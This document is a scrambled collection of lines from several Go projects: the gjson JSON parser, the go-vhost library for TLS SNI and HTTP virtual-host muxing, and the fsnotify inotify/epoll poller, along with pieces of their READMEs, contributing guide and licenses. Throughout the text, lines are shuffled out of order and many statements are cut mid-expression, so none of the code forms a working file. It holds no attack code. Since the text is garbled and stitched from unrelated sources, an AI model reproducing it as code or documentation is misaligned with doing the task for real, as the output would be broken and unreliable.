"assign(ParseBytes(data), v)"
"func validarray(data []byte, i int) (outi int, ok bool) {"
if data[i] == 'e' 
if len(query) < 2 
1] == '%') {
if jsval.Type == Null {
"case ""prefix"":"
rp := parseArrayPath(path)
"dst = append(dst, s...)"
var key Result
if i > len(c.json) {
"if sub.name[0] == '""' "
"""         >> 3"
if (json[i] >= '0' 
// @pretty modifier makes the json look nice.
r.piped = true
 query[1] != '[') {
n = int64(f)
"func parseUint(s string) (n uint64, ok bool) {"
// parse_key_string
if c.json[i] == '{' {
depth--
if keys {
// neither are uppercase
switch t {
" rp.part == """
"1, c.json[s:i], true, true"
depth := 1
c.value.Type = String
case value[0] == '<' 
"r := t.arrayOrMap('{', false)"
// Time returns a time.Time representation.
reflect.Int64:
"n, ok = parseUint(t.Raw)"
"""github.com/tidwall/match"""
True
"// If working with bytes, this method preferred over Get(string(data), path)"
"parseContext, i int, path string) (int, bool) {"
// splitQuery takes a query and splits it into three parts:
 i < len(t.Raw)
switch vc {
 path[i] == '(' {
"// Index of raw value in original json, zero means index unknown"
goval.SetString(jsval.String())
"n, _ := strconv.ParseUint(json[:4], 16, 64)"
fieldsmu.RUnlock()
n = n
return
Type Type
return value.Str > rpv
count
module github.com/tidwall/gjson
go 1.12
github.com/tidwall/match v1.0.1
github.com/tidwall/pretty v1.0.0
require (
parseContext) {
if len(c.value.Raw) > 0 
// raw is nil
(c.value.Raw)))
c.value.Index = 0
func bytesString(b []byte) string {
[]byte)(unsafe.Pointer(
import (
// str is nil
json))
// safely copy both the raw and str slice headers to strings
"result.Str = """""
build !appengine
rawh.Len {
 c.value.Index >= len(json) {
"rawh := reflect.SliceHeader{Data: rawhi.Data, Len: rawhi.Len}"
"// str has data, safely copy the slice header to a string"
int(strh.Data)
 !c.calcd {
// copies and allocations for the large json string->[]byte.
// of the resulting value. If the position cannot be found then Index zero is
"""reflect"""
"json)), path)"
string)(unsafe.Pointer(
"s)).Data,"
result = Get(
strh.Len <= int(rawh.Data)
// getBytes casts the input json bytes to a string and safely returns the
// results as uniquely allocated data. This operation is intended to minimize
rawhi := 
strhi := 
// create byte slice headers
if strh.Data == 0 {
Data: (
"Cap:  len(s),"
result.Raw = string(
return result
if json != nil {
result.Raw))
// used instead.
func stringBytes(s string) []byte {
strh)))
} else if rawh.Data == 0 {
// Str is a substring of Raw.
if rawh.Data == 0 {
rawh)))
c.value.Index = int(rhdr.Data - jhdr.Data)
if c.value.Index < 0 
// safely get the string headers
"Len:  len(s),"
var result Result
package gjson
reflect.SliceHeader{
start := int(strh.Data - rawh.Data)
build !js
"func fillIndex(json string, c "
} else {
result.Str))
result.Str = result.Raw[start : start
strh.Len]
// fillIndex finds the position of Raw data and assigns it to the Index field
"""unsafe"""
} else if strh.Data >= rawh.Data 
reflect.StringHeader)(unsafe.Pointer(
"strh := reflect.SliceHeader{Data: strhi.Data, Len: strhi.Len}"
"result.Raw = """""
// unsafe cast to string
result.Str = string(
"// raw has data, safely copy the slice header to a string"
// substring the raw
"func getBytes(json []byte, path string) Result {"
jhdr := 
rhdr := 
return 
// safely copy the raw slice header
"// Read header, payload."
"block, "
return alertRecordOverflow
ClientHelloMsg 
cipherSuiteLen {
data []byte
"// First message, be extra suspicious:"
m.SessionTicket = nil
func (e alert) String() string {
m.TicketSupported = true
if len(data) < length {
 strconv.Itoa(int(e)) 
"return nil, alertUnexpectedMessage"
"""errors"""
// an SSLv2 client.
recordTypeHandshake recordType = 22
for m < n {
"return b, nil"
section-5.5.2
// returning a block with those n bytes and a
TLSConn{sharedConn: c}
"// No valid TLS record has a type of 0x80, however SSLv2 handshakes"
// TLS parses the ClientHello message on conn and returns
msg := new(ClientHelloMsg)
if err := readRecord()
"// resize resizes block to be n bytes, growing if necessary."
extensionSupportedCurves uint16 = 10
for {
"block, n int) ("
SessionId          []byte
b.data = b.data[0 : len(b.data)
// cipherSuiteLen is the number of bytes of cipher suite numbers. Since
TicketSupported    bool
break
sessionIdLen]
section-3.2
return true
sessionIdLen {
"block) readFromUntil(r io.Reader, n int) error {"
ClientHelloMsg) unmarshal(data []byte) bool {
b.off = recordHeaderLen
b := nextBlock
// http://tools.ietf.org/html/rfc5077
tlsConn = 
// this might not be a TLS client.
m.OcspStapling = length > 0 
compressionMethodsLen]
NextProtoNeg       bool
if cipherSuiteLen%2 == 1 
case extensionSupportedCurves:
"copy(m.SupportedPoints, data[1:])"
extensionServerName      uint16 = 0
// block with the remainder.  the latter may be nil.
d = d[2:]
// reserve makes sure that block contains a capacity of at least n bytes.
cipherSuiteLen:]
if length > 0 {
"block  // raw input, right off the wire"
// readHandshake reads the next handshake message from
n := int(b.data[3])<<8 
"alertUnexpectedMessage: ""unexpected message"","
vers := uint16(b.data[1])<<8 
type block struct {
"return nil, err"
"return nil, alertInternalError"
 data[0] == statusTypeOCSP
SupportedCurves    []uint16
// http://tools.ietf.org/html/rfc4492
nameLen := int(d[1])<<8 
return new(block)
data = data[39
data = data[length:]
"if err := b.readFromUntil(rd, recordHeaderLen)"
 uint16(b.data[2])
return false
m.Vers = uint16(data[4])<<8 
 int(d[2])
 2048 // maximum ciphertext payload length
"""io"""
// Use of this source code is governed by a BSD-style
if data[0] != typeClientHello {
"// splitBlock splits a block after the first n bytes,"
b.data = b.data[0:n]
 uint16(data[3
"s, ok := alertText[e]"
var (
maxHandshake    = 65536        // maximum handshake we support (protocol max is 16 MB)
typ := recordType(b.data[0])
Random             []byte
if nameType == 0 {
// It implements the net.Conn interface.
data = hand.Next(4 
// TLS record types.
"n = copy(p, b.data[b.off:])"
m.CompressionMethods = data[1 : 1
numCurves := l / 2
"return b, bb"
length := int(data[2])<<8 
if length < 1 {
"""strconv"""
case extensionSupportedPoints:
// newBlock allocates a new block
 len(data) < 39
m.NextProtoNeg = false
block {
m.ServerName = string(d[0:nameLen])
nextBlock = newBlock()
"alertInternalError:     ""internal error"","
b.data = data
// Portions of the TLS code are:
if cap(b.data) >= n {
m.TicketSupported = false
// or else returns an error.
// start with a uint16 length where the MSB is set and the first record
return e.String()
// it's probably not real.
Vers               uint16
package vhost
l := int(data[0])
"data := make([]byte, len(b.data), m)"
func (e alert) Error() string {
extensionsLength := int(data[0])<<8 
if err != nil {
// and updates the record layer state.
// Caller must be in sync with connection:
return s
 int(data[1])
data = data[1
compressionMethodsLen {
maxPlaintext    = 16384        // maximum plaintext payload length
"copy(data, b.data)"
bb := newBlock()
if len(data) < 1
for hand.Len() < 4
type ClientHelloMsg struct {
TLSConn) Free() {
 int(data[3])
case extensionSessionTicket:
"if tlsConn.ClientHelloMsg, err = readClientHello(rd)"
if l%2 == 1 
extensionSessionTicket   uint16 = 35
" "")"""
m.NextProtoNeg = true
alertInternalError     alert = 80
for len(data) != 0 {
alertUnexpectedMessage alert = 10
b.off 
if (typ != recordTypeHandshake) 
m.OcspStapling = false
return c.ClientHelloMsg.ServerName
c.ClientHelloMsg = nil
"// a new, unread connection with metadata for virtual host muxing"
alertRecordOverflow    alert = 22
 int(b.data[4])
const (
return alertUnexpectedMessage
ServerName         string
ClientHelloMsg
b.reserve(n)
recordHeaderLen = 5            // record header length
extensionNextProtoNeg    uint16 = 13172 // not IANA assigned
func (b 
// quick case
n := int(data[1])<<16 
// the record layer.
case extensionNextProtoNeg:
if len(data) == 0 {
if !msg.unmarshal(data) {
"return ""alert("" "
if len(data) < 42 {
 int(data[2])<<8 
if len(data) > maxPlaintext {
d = d[3:]
"TLSConn, err error) {"
l := int(data[0])<<8 
 uint16(data[5])
m.Random = data[6:38]
"return """""
numCipherSuites := cipherSuiteLen / 2
i])<<8 
// ClientHello is optionally followed by extension data
var nextBlock 
m = 1024
"// Bail out before reading a full 'body', if possible."
if n > cap(b.data) {
// Copyright 2010 The Go Authors. All rights reserved.
 err != nil {
 len(data) < 2
"// they are uint16s, the number must be even."
return err
 i < numNames
// TLS virtual hosting
data = data[2
m.Raw = data
if m == 0 {
// read until have enough.
// A Conn represents a secured connection.
SessionTicket      []uint8
"m.SupportedCurves = make([]uint16, numCurves)"
"m.ServerName = """""
"""net"""
// readRecord reads the next TLS record from the connection
 n >= 0x3000 {
d = d[nameLen:]
if c.ClientHelloMsg == nil {
"c, rd := newShared(conn)"
maxCiphertext   = 16384 
"alertRecordOverflow:    ""record overflow"","
m.CipherSuites[i] = uint16(data[2
"copy(bb.data, b.data[n:])"
nameType := d[0]
 vers >= 0x1000 
sharedConn
m.SessionTicket = data[:length]
func TLS(conn net.Conn) (tlsConn 
d := data[2:]
m.SessionId = data[39 : 39
// is always < 256 bytes long. Therefore typ == 0x80 strongly suggests
if typ == 0x80 {
if n > maxCiphertext {
"b, nextBlock = splitBlock(b, recordHeaderLen"
"m.CipherSuites = make([]uint16, numCipherSuites)"
m.SupportedCurves[i] = uint16(d[0])<<8 
func (m 
// A block is a simple data buffer.
"// If the version is >= 16.0, it's probably not real."
section-5.5.1
Raw                []byte
sessionIdLen:]
 uint16(d[1])
compressionMethodsLen := int(data[0])
data = data[4:]
OcspStapling       bool
// else application data.  (We don't support renegotiation.)
var hand bytes.Buffer // handshake data waiting to be read
func splitBlock(b 
var alertText = map[alert]string{
if length != l
block) reserve(n int) {
 uint16(data[1])
 i < numCurves
return nil
"""bytes"""
func newBlock() 
if n > maxHandshake {
"if err := b.readFromUntil(rd, recordHeaderLen"
"return errors.New(""tls: unsupported SSLv2 handshake received"")"
block) resize(n int) {
bb.resize(len(b.data) - n)
data = data[2:]
TLSConn) Host() string {
if len(data) < 4 {
block) {
"// handshake data if handshake not yet completed,"
"// Similarly, a clientHello message encodes in"
if len(data) < 1 {
if sessionIdLen > 32 
"m, err := r.Read(b.data[len(b.data):cap(b.data)])"
"// well under a kilobyte.  If the length is >= 12 kB,"
// TLS handshake message types.
CipherSuites       []uint16
cipherSuiteLen := int(data[0])<<8 
// readFromUntil reads from r into b until b contains at least n bytes
data := b.data[b.off:]
if len(d) < nameLen {
type TLSConn struct {
case extensionServerName:
// license that can be found in the LICENSE file.
if len(data) < 2 {
sessionIdLen := int(data[38])
numNames := int(data[0])<<8 
statusTypeOCSP uint8 = 1
// TLS extension numbers
extensionStatusRequest   uint16 = 5
SupportedPoints    []uint8
// Process message.
typeClientHello uint8 = 1
if length < 2 {
func readClientHello(rd io.Reader) (
data := hand.Bytes()
if len(b.data) <= n {
import (
type recordType uint8
off  int // index for Read
case extensionStatusRequest:
if len(b.data) >= n {
extension := uint16(data[0])<<8 
if ok {
"block) Read(p []byte) (n int, err error) {"
"m.SupportedPoints = make([]uint8, l)"
for i := 0
func (c 
extensionSupportedPoints uint16 = 11
 length != l
"ClientHelloMsg, error) {"
if len(d) < 3 {
readRecord := func() error {
 i < numCipherSuites
// TLS CertificateStatusType (RFC 3546)
if extensionsLength != len(data) {
CompressionMethods []uint8
"return msg, nil"
switch extension {
compressionMethodsLen:]
type alert uint8
return
if nextBlock == nil {
hand.Write(data)
m := cap(b.data)
// The current max version is 3.1.
"l, ok := m.get(host)"
"Listener) Accept() (net.Conn, error) {"
registry     map[string]
go m.handle(conn)
HTTP/1.0 500 Internal Server Error
// not listening for.
"mux, err := NewVhostMuxer(listener, fn, muxTimeout)"
conn.Write([]byte(notFound))
if r := recover()
"vconn, err := m.vhostFn(conn)"
// Addr returns the address of the bound listener used by the parent muxer.
// recover from failures
"return mux, nil"
"TLSMuxer, error) {"
Content-Length: 14
registry:   make(map[string]
VhostMuxer{
type BadRequest struct {
"if err := m.set(name, vhost)"
"VhostMuxer) Listen(name string) (net.Listener, error) {"
defer m.Unlock()
default:
VhostMuxer) run() {
// run is the VhostMuxer's main loop for accepting new connections from the wrapped listener
// Listen call.
// extract the name
// look for a matching wildcard
return nil
"muxErrors:  make(chan muxErr),"
if !ok {
Internal Server Error
"HTTPMuxer, error) {"
l.mux.del(l.name)
// an error encountered when multiplexing a connection
mux := 
"m.sendError(conn, BadRequest{fmt.Errorf(""Failed to extract vhost name: %v"", err)})"
"name = strings.Join(parts[i:], ""."")"
"name:   name,"
func (l 
badRequest = 
vhost := 
Content-Length: 22
// Listener is returned by a call to Listen() on a muxer. A Listener
if err = vconn.SetDeadline(time.Time{})
"VhostMuxer) NextError() (net.Conn, error) {"
m.HandleError(m.NextError())
host = name
 i < len(parts)-1
accept chan Conn
close(l.accept)
"m.muxErrors <- muxErr{conn: conn, err: err}"
Listener) error {
"""strings"""
Listener) Name() string {
"m.sendError(nil, Closed{err})"
type (
"parts := strings.Split(name, ""."")"
"fn := func(c net.Conn) (Conn, error) { return HTTP(c) }"
"accept: make(chan Conn),"
"TLSMuxer{mux}, err"
"func NewVhostMuxer(listener net.Listener, vhostFn muxFn, muxTimeout time.Duration) ("
"m.sendError(nil, err)"
"func NewHTTPMuxer(listener net.Listener, muxTimeout time.Duration) ("
l.accept <- vconn
"netErr, ok := err.(net.Error)"
"return muxErr.conn, muxErr.err"
 r != nil {
Listener // registry of name -> listener
"muxTimeout: muxTimeout,"
"listener:   listener,"
type Listener struct {
// normalize the name
error
notFound = 
// BadRequest is returned when extraction of the vhost name fails
HTTP/1.0 404 Not Found
"HTTPMuxer) HandleError(conn net.Conn, err error) {"
Content-Length: 12
// NewHTTPMuxer begins muxing HTTP connections on the given listener by inspecting
return m.VhostMuxer.Listen(host)
// invoke this function if you do not want to handle the errors yourself.
conn.Write([]byte(serverError))
continue
"m.sendError(conn, fmt.Errorf(""NameMux.handle failed with error %v"", r))"
if isClosed(err) {
"return nil, fmt.Errorf(""Listener closed"")"
 err != nil {
for {
package vhost
"HTTPMuxer{mux}, err"
type Closed struct {
} else {
VhostMuxer) get(name string) (l 
// only receives connections that were made to the name passed into the muxer's
// handle muxes a connection accepted from the listener
 exists {
name   string
"return conn, nil"
// a new virtual-host multiplexed connection
// Name returns the name of the virtual host this listener receives connections on.
break
// connections for the given name over the returned listener.
if conn == nil {
// virtual host name.
sync.RWMutex                      // protects the registry
if err != nil {
m.listener.Close()
name = normalize(name)
"m.sendError(vconn, NotFound{fmt.Errorf(""Host not found: %v"", host)})"
"parts[i] = """
 ok {
"vhostFn:    vhostFn,"
"Listener, ok bool) {"
// this is the function you apply to a net.Conn to get
"""fmt"""
defer m.RUnlock()
"conn, err := m.NextError()"
return l.name
"return vhost, nil"
import (
// You must invoke this function if you do not want to handle the errors yourself.
muxTimeout   time.Duration        // a connection fails if it doesn't send enough data to mux after this timeout
// Make sure we detect dead connections while we decide how to multiplex
// Closed is returned when the underlying connection is closed
Listener{
"fn := func(c net.Conn) (Conn, error) { return TLS(c) }"
case NotFound:
TLSMuxer) HandleErrors() {
m.RLock()
normalize = strings.ToLower
"host, _, err := net.SplitHostPort(name)"
case BadRequest:
mux    
if ok {
"if _, exists := m.registry[name]"
HTTPMuxer) HandleErrors() {
"if _, ok := err.(Closed)"
"""net"""
"TLSMuxer) Listen(name string) (net.Listener, error) {"
Bad Request
isClosed  = func(err error) bool {
// Listen begins multiplexing the underlying connection to send new
return l.mux.listener.Addr()
// Close stops the parent muxer from listening for connections to the mux'd
for i := 0
defer func() {
type NotFound struct {
VhostMuxer) handle(conn net.Conn) {
// Accept returns the next mux'd connection for this listener and blocks
// NextError returns the next error encountered while mux'ing a connection.
host := normalize(vconn.Host())
"// Listener implements the net.Listener interface, so you can Accept() new"
if err := conn.SetDeadline(time.Now().Add(m.muxTimeout))
"delete(m.registry, name)"
// closes connections which are invalid or destined for virtual host names that it is
// XXX: respond with valid TLS close messages
VhostMuxer
serverError = 
"""time"""
"muxFn func(net.Conn) (Conn, error)"
"VhostMuxer, error) {"
Listener) Addr() net.Addr {
return 
type TLSMuxer struct {
m.Lock()
"return fmt.Errorf(""name %s is already bound"", name)"
// until one is available.
"conn, err := m.listener.Accept()"
// TLS SNI never includes the port
"return nil, err"
// XXX: include name in address
type VhostMuxer struct {
// look up the correct listener
conn net.Conn
HTTP/1.0 400 Bad Request
switch err.(type) {
case Closed:
"// HandleErrors is the default error handler for TLS muxers. At the moment, it simply"
Listener) Close() error {
muxErr := <-m.muxErrors
muxErr struct {
"// connections and Close() it when finished. When you Close() a Listener,"
return netErr.Temporary()
// the HTTP Host header in new connections.
"m.sendError(conn, fmt.Errorf(""Failed to set deadline: %v"", err))"
"Listener),"
conn.Close()
// the parent muxer will stop listening for connections to the Listener's name.
VhostMuxer) Close() {
VhostMuxer) del(name string) {
return false
func (m 
vhostFn      muxFn                // new connections are multiplexed by applying this function
m.registry[name] = l
go mux.run()
"conn, ok := <-l.accept"
muxErrors    chan muxErr          // all muxing errors are sent over this channel
"VhostMuxer) sendError(conn net.Conn, err error) {"
// The net.Conn may be nil if the wrapped listener returned an error from Accept()
"""sync"""
"l, ok = m.registry[name]"
"mux:    m,"
conn.Write([]byte(badRequest))
err  error
if conn != nil {
"func NewTLSMuxer(listener net.Listener, muxTimeout time.Duration) ("
// NotFound is returned when a vhost is not found
return
type HTTPMuxer struct {
// Close closes the underlying listener
"VhostMuxer) set(name string, l "
404 not found
// HandleErrors handles muxing errors by calling .NextError(). You must
var (
"m.sendError(vconn, fmt.Errorf(""Failed unset connection deadline: %v"", err))"
// NewTLSMuxer begins muxing TLS connections by inspecting the SNI extension.
listener     net.Listener         // listener on which we mux connections
const (
net.Conn
import (
package vhost
"""net"""
Free()
Host() string
type Conn interface {
"HTTPConn, err error) {"
if c.Request == nil {
import (
return c.Request.Host
// HTTP parses the head of the first HTTP request on conn and returns
HTTPConn) Free() {
"return """""
"if httpConn.Request, err = http.ReadRequest(bufio.NewReader(rd))"
// You probably don't need access to the request body and this makes the API
Request 
c.Request = nil
HTTPConn) Host() string {
"""net"""
// simpler by allowing you to call Free() optionally
http.Request
func (c 
 err != nil {
"c, rd := newShared(conn)"
"""bufio"""
package vhost
httpConn.Request.Body.Close()
HTTPConn{sharedConn: c}
return
type HTTPConn struct {
"// a new, unread connection with metadata for virtual host muxing"
func HTTP(conn net.Conn) (httpConn 
// Free sets Request to nil so that it can be garbage collected
"""net/http"""
httpConn = 
sharedConn
= n2
import (
if c.vhostBuf == nil {
bytes.Buffer // all of the initial data that has to be read in order to vhost a connection is saved here
sharedConn{
c.Lock()
initVhostBufSize = 1024 // allocate 1 KB up front to try to avoid resizing
type sharedConn struct {
c.vhostBuf = nil
"n2, err = c.Conn.Read(p[n:])"
vhostBuf 
"vhostBuf: bytes.NewBuffer(make([]byte, 0, initVhostBufSize)),"
"""net"""
"sharedConn) Read(p []byte) (n int, err error) {"
c := 
return c.Conn.Read(p)
// end of the request buffer
if err == io.EOF {
// and make sure we don't read from it again
func (c 
"""bytes"""
"""io"""
"sharedConn, io.Reader) {"
package vhost
"""sync"""
sync.Mutex
"Conn:     conn,"
c.Unlock()
return
// continue reading from the connection
// let the request buffer get garbage collected
net.Conn               // the raw connection
// update total read
"return c, io.TeeReader(conn, c.vhostBuf)"
func newShared(conn net.Conn) (
var n2 int
"n, err = c.vhostBuf.Read(p)"
const (
"go func(vh virtualHost, ml net.Listener) {"
// ...
"l, _ := net.Listen(""tcp"", "
// Target Host: example.com
"panic(""Not a valid TLS connection!"")"
// vhostConn.ClientHelloMsg == nil (TLS)
// vhostConn.Request == nil (HTTP)
"panic(""Not a valid http connection!"")"
"if vhostConn, err = vhost.TLS(conn)"
The lower-level go-vhost interface are just functions which extract the name/routing information for the given protocol and return an object implementing net.Conn which works as if no bytes had been consumed.
"conn.Write([]byte(""vhost not found""))"
"conn.Write([]byte(""server error""))"
// accept a new connection
switch err.(type) {
"// vhostConn.Host() == """""
"Likewise for TLS, you can look at detailed information about the ClientHello message:"
"conn.Write([]byte(""bad request""))"
listen)
"log.Printf(""closed conn: %s"", err)"
"mux, _ := vhost.NewHTTPMuxer(l, muxTimeout)"
 Memory reduction with Free
case vhost.Closed:
"muxListener, _ := mux.Listen(vhost.Name())"
conn.Close()
default:
 Low-level API usage
"go-vhost is a simple library that lets you implement virtual hosting functionality for different protocols (HTTP and TLS so far). go-vhost has a high-level and a low-level interface. The high-level interface lets you wrap existing net.Listeners with ""muxer"" objects. You can then Listen() on a muxer for a particular virtual host name of interest which will return to you a net.Listener for just connections with the virtual hostname of interest."
"conn, _ := listener.Accept()"
"for _, v := range virtualHosts {"
// GET / HTTP/1.1
"log.Printf(""got a bad request!"")"
// look up the upstream host
"conn, err := mux.NextError()"
The entire HTTP request headers are available for inspection in case you want to mux on something besides the Host header:
"fmt.Printf(""Target Host: "", vhostConn.Host())"
go vh.Handle(conn)
vhostConn.Free()
"fmt.Printf(""%s"", bytes)"
"bytes, _ := ioutil.ReadAll(vhostConn)"
// Host: example.com
 Advanced introspection
"log.Printf(""got a connection for an unknown vhost"")"
"if vhostConn, err = vhost.HTTP(conn)"
"customRouting := vhost.Request.Header[""X-Custom-Routing-Header""]"
case vhost.NotFound:
// listen for connections to different domains
 Usage
"conn, _ := ml.Accept()"
for {
 err != nil {
// start multiplexing on it
case vhost.BadRequest:
if conn != nil {
sessionId := vhost.ClientHelloMsg.SessionId
// User-Agent: ...
 [API Documentation](https://godoc.org/github.com/inconshreveable/go-vhost)
"After you're done muxing, you probably don't need to inspect the header data anymore, so you can make it available for garbage collection:"
// parse out the HTTP request and the Host header
// vhostConn contains the entire request as if no bytes had been consumed
upstreamHost := hostMapping[vhostConn.Host()]
// free up the muxing data
httpVersion := vhost.Request.MinorVersion
vhost := v
 go-vhost
cipherSuites := vhost.ClientHelloMsg.CipherSuites
"// vhost.Name is a virtual hostname like ""foo.example.com"""
"}(vhost, muxListener)"
"distributed under the License is distributed on an ""AS IS"" BASIS,"
limitations under the License.
you may not use this file except in compliance with the License.
You may obtain a copy of the License at
"Licensed under the Apache License, Version 2.0 (the ""License"")"
"Unless required by applicable law or agreed to in writing, software"
   http://www.apache.org/licenses/LICENSE-2.0
See the License for the specific language governing permissions and
"WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
Copyright 2014 Alan Shreve
indent_size = 4
root = true
indent_style = tab
// false if there is not.
return poller
"// This is an absolute mystery, and should never ever happen."
epollin := false
"// If there are no events, try again."
"return false, errors.New(""epoll_wait returned more events than I know what to do with"")"
epollerr := false
poller.close()
pipe [2]int // Pipe for waking up
"return poller, nil"
"// I don't know whether epoll_wait returns the number of events returned,"
// If an error is waiting on the pipe file descriptor.
return nil
fdPoller) clearWake() error {
"fdPoller, error) {"
unix.Close(poller.pipe[0])
// Wait using epoll.
"return false, nil"
"n, errno := unix.Read(poller.pipe[0], buf)"
"for _, event := range ready {"
"n, errno := unix.Write(poller.pipe[1], buf)"
"// Buffer is full, poller will wake."
err := poller.clearWake()
"Fd:     int32(poller.fd),"
"fdPoller) wait() (bool, error) {"
"""errors"""
ready := events[:n]
fdPoller) wake() error {
// I decided to catch both by making the buffer one larger than the maximum.
// This should never happen. More events were returned than should be possible.
epollerr = true
"// This should not happen, but if it does, treat it as a wakeup."
epollhup := false
"errno = unix.EpollCtl(poller.epfd, unix.EPOLL_CTL_ADD, poller.pipe[0], "
epollin = true
var errno error
// Register inotify fd with epoll
poller.epfd = -1
"buf := make([]byte, 1)"
// Close the write end of the poller.
"return true, nil"
poller.fd = fd
poller.pipe[0] = -1
continue
" pipe[0] is the read end, pipe[1] the write end."
for {
return errno
// license that can be found in the LICENSE file.
"// 3 possible events per fd, and 2 fds, makes a maximum of 6 events."
if n > 6 {
// or the total number of events ready.
if poller.epfd != -1 {
if epollhup 
if err != nil {
type fdPoller struct {
fdPoller) close() {
"Fd:     int32(poller.pipe[0]),"
func (poller 
// Copyright 2015 The Go Authors. All rights reserved.
unix.Close(poller.epfd)
import (
unix.EPOLLERR != 0 {
"errno = unix.EpollCtl(poller.epfd, unix.EPOLL_CTL_ADD, poller.fd, "
"return false, errors.New(""Error on the pipe descriptor."")"
func emptyPoller(fd int) 
epollhup = true
if errno == unix.EINTR {
// You have to be woken up a LOT in order to get to 100!
// Create pipe
if event.Events
// Create a new inotify poller.
 epollin {
poller.pipe[1] = -1
defer func() {
// Register pipe fd with epoll
if n == -1 {
package fsnotify
if event.Fd == int32(poller.fd) {
"// Close all poller file descriptors, but not the one passed to it."
"return false, errno"
poller := emptyPoller(fd)
if n == 0 {
"// Write pipe descriptor was closed, by us. This means we're closing down the"
if poller.pipe[0] != -1 {
"return false, err"
"// If an error is waiting on the file descriptor, we should pretend"
event)
// There is data to read.
fd   int    // File descriptor (as returned by the inotify_init() syscall)
// Create epoll fd
poller := new(fdPoller)
unix.EPOLLIN != 0 {
"// watcher, and we should wake up."
if poller.epfd == -1 {
if event.Fd == int32(poller.pipe[0]) {
build linux
"""golang.org/x/sys/unix"""
"// something is ready to read, and let unix.Read pick up the error."
"// Returns true if something is ready to be read,"
unix.Close(poller.pipe[1])
if errno == unix.EAGAIN {
"return nil, errno"
"Events: unix.EPOLLIN,"
unix.EPOLLHUP != 0 {
 epollerr 
// Use of this source code is governed by a BSD-style
event = unix.EpollEvent{
"// This creates an inotify handler, and an epoll handler."
if poller.pipe[1] != -1 {
"buf := make([]byte, 100)"
"n, errno := unix.EpollWait(poller.epfd, events, -1)"
"// This is a regular wakeup, so we have to clear the buffer."
"// Buffer is empty, someone else cleared our wake."
fdPoller {
"errno = unix.Pipe2(poller.pipe[:], unix.O_NONBLOCK)"
if errno != nil {
func newFdPoller(fd int) (
"events := make([]unix.EpollEvent, 7)"
epfd int    // Epoll file descriptor
"poller.epfd, errno = unix.EpollCreate1(0)"
event := unix.EpollEvent{
 Contributing
"Before doing a pull request, please do your best to test your changes on multiple platforms, and list which platforms you were able/unable to test on."
1. Fork fsnotify on GitHub
 How fsnotify is Developed
Please indicate that you have signed the CLA in your pull request.
.VGa5yZPF_Zs
vagrant up
" To issue a new release, the maintainers will:"
 go test'
3. Ensure everything works and the tests pass (see below)
downloads).
Help maintaining fsnotify is welcome. To be a maintainer:
git checkout -b my-new-feature
" You must be able to run the test suite on Mac, Windows, Linux and BSD."
 Maintainers may modify or squash commits rather than asking contributors to.
"For smooth sailing, always use the original import path. Installing with "
" Once setup, you can run the test suite on a given OS with a single command "
2. Add your remote (
vagrant up linux
 Contributor License Agreement
 Maintainers
 Install [Vagrant](http://www.vagrantup.com/) and [VirtualBox](https://www.virtualbox.org/)
 makes this easy. 
 Update the CHANGELOG
Notice: fsnotify file system events won't trigger in shared folders. The tests get around this limitation by using the /tmp directory.
 Development is done on feature branches.
git commit -am 'Add some feature'
git push fork my-new-feature
This workflow is [thoroughly explained by Katrina Owen](https://splice.com/blog/contributing-open-source-git-repositories-go/).
 A code example to reproduce the problem is appreciated.
 from the project folder. You can also setup just one box with 
"To keep master clean, the fsnotify project uses the ""apply mail"" workflow outlined in Nathaniel Talbott's post [""Merge pull request"" Considered Harmful][am]. This requires installing [hub][]."
Releases are tagged using [Semantic Versioning](http://semver.org/).
 Run 
"fsnotify uses build tags to compile different code on Linux, BSD, macOS, and Windows."
"Right now there is no equivalent solution for Windows and macOS, but there are Windows VMs [freely available from Microsoft](http://www.modern.ie/en-us/virtualization-tools"
4. Create a new Pull Request on GitHub
vagrant ssh linux -c 'cd fsnotify/fsnotify
 Issues
 Pull Requests
" Tag a version, which will become available through gopkg.in."
 folder.
[am]: http://blog.spreedly.com/2014/06/24/merge-pull-request-considered-harmful/
" Tests are run on BSD, Linux, macOS and Windows."
3. Push to the branch (
[hub]: https://github.com/github/hub
 How to Fork
vagrant up bsd
"fsnotify is derived from code in the [golang.org/x/exp](https://godoc.org/golang.org/x/exp) package and it may be included [in the standard library](https://github.com/fsnotify/fsnotify/issues/1) in the future. Therefore fsnotify carries the same [LICENSE](https://github.com/fsnotify/fsnotify/blob/master/LICENSE) as Go. Contributors retain their copyright, so you need to fill out a short form before we can accept your contribution: [Google Individual Contributor License Agreement](https://developers.google.com/open-source/cla/individual)."
 Testing
go get
 Submit a pull request and sign the CLA as above.
Contribute upstream:
To aid in cross-platform testing there is a Vagrantfile for Linux and BSD.
git remote add fork git@github.com:mycompany/repo.git
 Pull requests are reviewed and [applied to master][am] using [hub][].
1. Install from GitHub (
4. Commit your changes (
 Request features and report bugs using the [GitHub Issue Tracker](https://github.com/fsnotify/fsnotify/issues).
All code changes should be internal pull requests.
 or 
2. Create your feature branch (
" When you're done, you will want to halt or destroy the Vagrant boxes."
 Setup [Vagrant Gopher](https://github.com/nathany/vagrant-gopher) in your 
go get -u github.com/fsnotify/fsnotify
" (note: the BSD box doesn't support Windows hosts at this time, and NFS may prompt for your host OS password)"
 Please indicate the platform you are using fsnotify on.
OS        
 FAQ
62][
 Related Projects
macOS         
Adapter   
faq) for usage information.
[contributing]: https://github.com/fsnotify/fsnotify/blob/master/CONTRIBUTING.md
svg=true)](https://ci.appveyor.com/project/NathanYoungman/fsnotify/branch/master)
status.svg)](https://godoc.org/github.com/fsnotify/fsnotify) [![Go Report Card](https://goreportcard.com/badge/github.com/fsnotify/fsnotify)](https://goreportcard.com/report/github.com/fsnotify/fsnotify)
inotify   
Supported [![Build Status](https://travis-ci.org/fsnotify/fsnotify.svg
11]: https://github.com/fsnotify/fsnotify/issues/11
fanotify  
Polling   
Solaris 11    
7]: https://github.com/howeyc/fsnotify/issues/7
Please refer to [CONTRIBUTING][] before opening an issue or pull request.
Do I have to watch the Error and Event channels in a separate goroutine
fsnotify utilizes [golang.org/x/sys](https://godoc.org/golang.org/x/sys) rather than 
Please see [the documentation](https://godoc.org/github.com/fsnotify/fsnotify) and consult the [FAQ](
18]: https://github.com/fsnotify/fsnotify/issues/18
"When I watch a directory, are all subdirectories watched as well"
How many files can be watched at once
" BSD / OSX: sysctl variables ""kern.maxfiles"" and ""kern.maxfilesperproc"", reaching these limits results in a ""too many open files"" error."
"No, you must add watches for any directory you want to watch (a recursive watcher is on the roadmap ["
 until we have a native FSEvents implementation (see [
 Example
Why am I receiving multiple events for the same file on OS X
